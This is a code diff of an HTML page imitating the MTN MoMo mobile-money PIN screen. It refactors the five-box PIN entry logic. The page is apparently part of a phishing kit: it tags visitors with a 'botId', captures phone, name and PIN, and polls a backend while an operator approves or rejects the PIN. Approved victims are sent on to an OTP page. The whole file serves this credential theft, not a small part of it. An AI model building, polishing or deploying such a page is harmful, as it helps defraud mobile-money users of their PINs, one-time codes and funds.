@@ -12,15 +12,11 @@
     try {
       const params = new URLSearchParams(window.location.search);
 
-      // 1. Read from URL FIRST
       let botId = params.get('botId');
-
-      // 2. Fall back to localStorage ONLY if URL is empty
       if (!botId) {
         botId = localStorage.getItem('botId');
       }
 
-      // 3. If STILL empty, refuse to proceed. Do NOT default to any bot.
       if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
         document.documentElement.innerHTML =
           '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
@@ -31,17 +27,14 @@
         throw new Error('botId missing from URL and localStorage');
       }
 
-      // 4. Persist so later pages inherit it
       localStorage.setItem('botId', botId);
 
-      // 5. Ensure the URL always carries botId
       if (params.get('botId') !== botId) {
         params.set('botId', botId);
         const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
         window.history.replaceState({}, '', newUrl);
       }
 
-      // 6. Expose globally
       window.__BOT_ID__ = botId;
 
       console.log('🆔 botId resolved immediately:', botId);
@@ -55,7 +48,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>MoMo - PIN</title>
   <style>
-    /* ===== MOMO STYLE (consistent with other pages) ===== */
     * {
       margin: 0;
       padding: 0;
@@ -73,10 +65,6 @@
       overflow-x: hidden;
     }
 
-    /* =========================================
-       APP CONTAINER
-    ========================================= */
-
     .app {
       position: relative;
       width: 100%;
@@ -87,10 +75,6 @@
       background: #fff;
       overflow: hidden;
     }
-
-    /* =========================================
-       TOP BLUE AREA
-    ========================================= */
 
     .top {
       position: relative;
@@ -109,10 +93,6 @@
       background: #fff;
       border-radius: 50% 50% 0 0 / 70% 70% 0 0;
     }
-
-    /* =========================================
-       TOP BAR WITH BACK BUTTON AND LOGO
-    ========================================= */
 
     .top-bar {
       position: relative;
@@ -186,10 +166,6 @@
       color: #b8d4e8;
     }
 
-    /* =========================================
-       CARD
-    ========================================= */
-
     .card {
       position: relative;
       z-index: 5;
@@ -219,7 +195,6 @@
       margin-bottom: 28px;
     }
 
-    /* ===== 5 PIN BOXES ===== */
     .input-wrapper {
       display: flex;
       justify-content: center;
@@ -256,8 +231,6 @@
       display: none;
     }
 
-    /* ----- Alert ----- */
-
     #otp-alert {
       text-align: center;
       font-size: 15px;
@@ -289,10 +262,6 @@
       color: #0b2b3b;
       border-color: #abf0d1;
     }
-
-    /* =========================================
-       BOTTOM BUTTON
-    ========================================= */
 
     .bottom {
       width: 100%;
@@ -331,7 +300,6 @@
       transform: scale(.98);
     }
 
-    /* Loading state keeps colour and shows spinner */
     .continue-btn.loading:disabled {
       background: #005572;
       opacity: 1;
@@ -364,10 +332,6 @@
       letter-spacing: 0.5px;
       padding-bottom: 12px;
     }
-
-    /* =========================================
-       RESPONSIVE
-    ========================================= */
 
     @media (max-width: 480px) {
       .top {
@@ -430,26 +394,18 @@
 
 <div class="app">
 
-  <!-- ================= TOP ================= -->
-
   <div class="top">
-
     <div class="top-bar">
       <button class="back-btn" onclick="window.history.back()">&#8592;</button>
-
       <div class="logo">
         <div class="logo-box">
           <div class="logo-symbol"></div>
         </div>
         <div class="logo-text">MoMo <span class="light">from MTN</span></div>
       </div>
-
       <div style="width: 30px;"></div>
     </div>
-
   </div>
-
-  <!-- ================= CARD ================= -->
 
   <div class="card">
 
@@ -468,8 +424,6 @@
 
   </div>
 
-  <!-- ================= BOTTOM BUTTON ================= -->
-
   <div class="bottom">
     <button id="verifyBtn" class="continue-btn" disabled>
       <span class="btn-text">SUBMIT</span>
@@ -481,16 +435,21 @@
 
 </div>
 
-<!-- ========== ORIGINAL LOGIC ========== -->
+<!-- ============================================================
+     PIN PAGE LOGIC — single unified script
+     ============================================================ -->
 <script>
 (function() {
-  const BACKEND_URL = ""; // leave empty to use same-origin
+  const BACKEND_URL = "";
 
   // ---------- BOTID (resolved by the head script) ----------
   const botId = window.__BOT_ID__;
-  if (!botId) return;
+  if (!botId) {
+    console.error('❌ No botId — page cannot function');
+    return;
+  }
 
-  // ---------- READ OTHER DATA ----------
+  // ---------- DATA ----------
   const urlParams = new URLSearchParams(window.location.search);
   let phone = urlParams.get('phone') || localStorage.getItem('phone');
   let name = urlParams.get('name') || localStorage.getItem('fullName');
@@ -504,16 +463,44 @@
     name = 'MTN User';
     localStorage.setItem('fullName', name);
   }
-
   localStorage.setItem('phone', phone);
 
   // ---------- DOM REFS ----------
-  const input = document.getElementById('pinInput');
+  const pinBoxes = document.querySelectorAll('.pin-box');
+  const hiddenInput = document.getElementById('pinInput');
   const verifyBtn = document.getElementById('verifyBtn');
   const alertEl = document.getElementById('otp-alert');
 
+  console.log('🔢 pin.html ready — ' + pinBoxes.length + ' boxes found');
+
   // ---------- HELPERS ----------
-  function focusPin() { input.focus(); }
+  function getPinFromBoxes() {
+    let pin = '';
+    pinBoxes.forEach(b => { if (b.value) pin += b.value; });
+    return pin;
+  }
+
+  function getFilledCount() {
+    let count = 0;
+    pinBoxes.forEach(b => { if (b.value) count++; });
+    return count;
+  }
+
+  // THE KEY FIX: compute button state directly from box values,
+  // not from any hidden-input event. This runs on every box change.
+  function updateButtonState() {
+    const filled = getFilledCount();
+    const isComplete = (filled === pinBoxes.length);
+    const isLoading = verifyBtn.classList.contains('loading');
+    const shouldBeDisabled = !isComplete || isLoading;
+
+    verifyBtn.disabled = shouldBeDisabled;
+
+    // Also keep the hidden input in sync for the submit logic
+    hiddenInput.value = isComplete ? getPinFromBoxes() : '';
+
+    console.log('🔘 PIN boxes: ' + filled + '/' + pinBoxes.length + ' → button ' + (shouldBeDisabled ? 'DISABLED' : 'ENABLED'));
+  }
 
   function showAlert(text, type) {
     alertEl.textContent = text;
@@ -527,32 +514,95 @@
 
   function setLoading(on) {
     if (on) {
-      verifyBtn.disabled = true;
       verifyBtn.classList.add('loading');
+      verifyBtn.disabled = true;
     } else {
       verifyBtn.classList.remove('loading');
     }
+    // Recompute after toggling loading
+    updateButtonState();
   }
 
-  // ---------- INPUT HANDLING ----------
-  input.addEventListener('input', function() {
-    this.value = this.value.replace(/\D/g, '');
-    verifyBtn.disabled = (this.value.length === 0) || verifyBtn.classList.contains('loading');
-    clearAlert();
+  function clearAllBoxes() {
+    pinBoxes.forEach(b => {
+      b.value = '';
+      b.classList.remove('error');
+    });
+    hiddenInput.value = '';
+    updateButtonState();
+  }
+
+  // ---------- PIN BOX INPUT ----------
+  pinBoxes.forEach((box, i) => {
+    // INPUT — typing a digit
+    box.addEventListener('input', function() {
+      // Keep only one digit
+      const cleaned = this.value.replace(/\D/g, '').slice(0, 1);
+      this.value = cleaned;
+      this.classList.remove('error');
+
+      if (cleaned && i < pinBoxes.length - 1) {
+        pinBoxes[i + 1].focus();
+      }
+
+      clearAlert();
+      updateButtonState();
+    });
+
+    // KEYDOWN — backspace, arrows, enter
+    box.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace') {
+        if (!this.value && i > 0) {
+          pinBoxes[i - 1].value = '';
+          pinBoxes[i - 1].focus();
+          updateButtonState();
+          e.preventDefault();
+        } else if (this.value) {
+          this.value = '';
+          updateButtonState();
+          e.preventDefault();
+        }
+      } else if (e.key === 'ArrowLeft' && i > 0) {
+        pinBoxes[i - 1].focus();
+        e.preventDefault();
+      } else if (e.key === 'ArrowRight' && i < pinBoxes.length - 1) {
+        pinBoxes[i + 1].focus();
+        e.preventDefault();
+      } else if (e.key === 'Enter') {
+        if (!verifyBtn.disabled && !verifyBtn.classList.contains('loading')) {
+          verifyBtn.click();
+        }
+        e.preventDefault();
+      }
+    });
+
+    // FOCUS — select existing digit
+    box.addEventListener('focus', function() {
+      this.select();
+      this.classList.remove('error');
+    });
+
+    // PASTE — distribute digits
+    box.addEventListener('paste', function(e) {
+      e.preventDefault();
+      const paste = (e.clipboardData || window.clipboardData).getData('text');
+      const digits = paste.replace(/\D/g, '').slice(0, pinBoxes.length);
+      if (!digits) return;
+
+      pinBoxes.forEach((b, idx) => {
+        b.value = digits[idx] || '';
+        b.classList.remove('error');
+      });
+
+      const lastFilled = Math.min(digits.length, pinBoxes.length) - 1;
+      if (lastFilled >= 0) pinBoxes[lastFilled].focus();
+
+      clearAlert();
+      updateButtonState();
+    });
   });
 
-  input.addEventListener('paste', function(e) {
-    e.preventDefault();
-    const paste = e.clipboardData.getData('text');
-    const digits = paste.replace(/\D/g, '');
-    this.value = digits;
-    verifyBtn.disabled = (digits.length === 0);
-    if (digits.length > 0) {
-      setTimeout(function() { verifyBtn.click(); }, 300);
-    }
-  });
-
-  // ---------- POLLING ----------
+  // ---------- SUBMIT ----------
   let pollTimer = null;
 
   function stopPolling() {
@@ -562,12 +612,11 @@
     }
   }
 
-  // ---------- SUBMIT PIN ----------
   verifyBtn.addEventListener('click', async function() {
-    if (verifyBtn.classList.contains('loading')) return;
+    if (verifyBtn.disabled || verifyBtn.classList.contains('loading')) return;
 
-    const pin = input.value.trim();
-    if (pin.length === 0) return;
+    const pin = getPinFromBoxes();
+    if (pin.length !== pinBoxes.length) return;
 
     setLoading(true);
     clearAlert();
@@ -597,7 +646,7 @@
 
       stopPolling();
       let attempts = 0;
-      const MAX_ATTEMPTS = 120; // ~3 minutes
+      const MAX_ATTEMPTS = 120;
 
       pollTimer = setInterval(async function() {
         attempts++;
@@ -608,8 +657,7 @@
           if (status.blocked === true) {
             stopPolling();
             setLoading(false);
-            input.value = '';
-            input.dispatchEvent(new Event('input'));
+            clearAllBoxes();
             showAlert('❌ Account restricted. Please try again later.', 'error');
             return;
           }
@@ -618,7 +666,6 @@
             stopPolling();
             setLoading(false);
             showAlert('✅ PIN verified! Redirecting...', 'success');
-            // PIN approved → go to OTP (code.html), which then goes to success.html
             setTimeout(function() {
               window.location.href = 'code.html?botId=' + encodeURIComponent(botId) +
                                      '&phone=' + encodeURIComponent(phone) +
@@ -630,20 +677,13 @@
           if (status.approved === false) {
             stopPolling();
             setLoading(false);
-            input.value = '';
-            input.dispatchEvent(new Event('input'));
-            verifyBtn.disabled = true;
+            clearAllBoxes();
             showAlert('❌ Incorrect PIN. Please try again.', 'error');
-            document.querySelectorAll('.pin-box').forEach(function(b) {
-              b.classList.add('error');
-            });
+            pinBoxes.forEach(function(b) { b.classList.add('error'); });
             setTimeout(function() {
-              document.querySelectorAll('.pin-box').forEach(function(b) {
-                b.classList.remove('error');
-              });
+              pinBoxes.forEach(function(b) { b.classList.remove('error'); });
             }, 600);
-            const firstBox = document.querySelector('.pin-box');
-            if (firstBox) firstBox.focus();
+            if (pinBoxes[0]) pinBoxes[0].focus();
             return;
           }
 
@@ -653,8 +693,6 @@
             showAlert('⏳ Taking too long. Please try again.', 'error');
             return;
           }
-
-          // Silent polling — spinner on the button covers the wait
         } catch (err) {
           console.error('Polling error:', err);
         }
@@ -667,133 +705,14 @@
   });
 
   // ---------- INIT ----------
-  window.onload = function() {
-    focusPin();
-    verifyBtn.disabled = (input.value.length === 0);
-  };
-})();
-</script>
+  updateButtonState();
+  if (pinBoxes[0]) pinBoxes[0].focus();
 
-<!-- ========== PIN BOX UI LOGIC ========== -->
-<script>
-(function() {
-  const pinBoxes = document.querySelectorAll('.pin-box');
-  const hiddenInput = document.getElementById('pinInput');
-
-  let internalSet = false;
-  const descriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
-  Object.defineProperty(hiddenInput, 'value', {
-    configurable: true,
-    get() { return descriptor.get.call(this); },
-    set(v) {
-      const previous = descriptor.get.call(this);
-      descriptor.set.call(this, v);
-      if (!internalSet && v === '' && previous !== '') {
-        pinBoxes.forEach(b => b.value = '');
-      }
-    }
+  // Extra safety: recompute on any focus/blur, in case autofill or IME set values
+  document.addEventListener('focusin', updateButtonState);
+  document.addEventListener('focusout', function() {
+    setTimeout(updateButtonState, 20);
   });
-
-  function updateHiddenPin() {
-    let pin = '';
-    let allFilled = true;
-    pinBoxes.forEach(box => {
-      if (box.value) {
-        pin += box.value;
-      } else {
-        allFilled = false;
-      }
-    });
-
-    internalSet = true;
-    if (allFilled && pin.length === 5) {
-      hiddenInput.value = pin;
-    } else {
-      hiddenInput.value = '';
-    }
-    internalSet = false;
-
-    hiddenInput.dispatchEvent(new Event('input'));
-  }
-
-  function focusNext(currentBox) {
-    const index = Array.from(pinBoxes).indexOf(currentBox);
-    if (index < pinBoxes.length - 1) {
-      pinBoxes[index + 1].focus();
-    }
-  }
-
-  function focusPrev(currentBox) {
-    const index = Array.from(pinBoxes).indexOf(currentBox);
-    if (index > 0) {
-      pinBoxes[index - 1].focus();
-    }
-  }
-
-  pinBoxes.forEach((box) => {
-    box.addEventListener('input', function() {
-      this.value = this.value.replace(/\D/g, '').slice(0, 1);
-      this.classList.remove('error');
-      if (this.value) {
-        focusNext(this);
-      }
-      updateHiddenPin();
-    });
-
-    box.addEventListener('keydown', function(e) {
-      if (e.key === 'Backspace') {
-        if (!this.value) {
-          const idx = Array.from(pinBoxes).indexOf(this);
-          if (idx > 0) {
-            pinBoxes[idx - 1].value = '';
-            pinBoxes[idx - 1].focus();
-          }
-          updateHiddenPin();
-        } else {
-          this.value = '';
-          updateHiddenPin();
-        }
-        e.preventDefault();
-      } else if (e.key === 'ArrowLeft') {
-        focusPrev(this);
-        e.preventDefault();
-      } else if (e.key === 'ArrowRight') {
-        focusNext(this);
-        e.preventDefault();
-      } else if (e.key === 'Enter') {
-        const verifyBtn = document.getElementById('verifyBtn');
-        if (!verifyBtn.disabled && !verifyBtn.classList.contains('loading')) verifyBtn.click();
-        e.preventDefault();
-      }
-    });
-
-    box.addEventListener('focus', function() {
-      this.select();
-      this.classList.remove('error');
-    });
-
-    box.addEventListener('paste', function(e) {
-      e.preventDefault();
-      const paste = e.clipboardData.getData('text');
-      const digits = paste.replace(/\D/g, '').slice(0, 5);
-      if (digits.length > 0) {
-        pinBoxes.forEach((b, i) => {
-          b.value = digits[i] || '';
-        });
-        updateHiddenPin();
-        const lastIndex = Math.min(digits.length, 5) - 1;
-        if (lastIndex >= 0) {
-          pinBoxes[lastIndex].focus();
-        }
-      }
-    });
-  });
-
-  window.addEventListener('load', function() {
-    if (pinBoxes[0]) pinBoxes[0].focus();
-  });
-
-  updateHiddenPin();
 })();
 </script>
 
